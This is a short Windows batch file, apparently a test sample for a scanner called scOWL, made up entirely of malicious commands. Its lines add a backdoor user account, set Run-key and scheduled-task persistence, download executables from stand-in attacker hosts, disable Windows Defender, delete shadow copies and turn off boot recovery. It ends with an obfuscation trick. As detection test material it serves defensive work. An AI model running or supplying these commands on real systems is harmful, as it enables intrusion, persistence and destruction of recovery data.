@echo off
:: Suspicious BAT script - scOWL test sample
net user hacker P@ssw0rd /add
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v svc /t REG_SZ /d "C:\Temp\svc.exe"
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\svc.exe" /sc onlogon
certutil -urlcache -split -f http://evil.example.com/payload.exe C:\Temp\payload.exe
bitsadmin /transfer job /download /priority normal http://10.0.0.1/malware.exe C:\Temp\malware.exe
curl -o C:\Temp\svc.exe http://192.168.1.100/svc.exe
wget http://evil.example.com/dropper.exe -O C:\Temp\dropper.exe
sc config WinDefend start= disabled
sc stop WinDefend
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No
set "p%var:~0,1%ath=C:\Temp"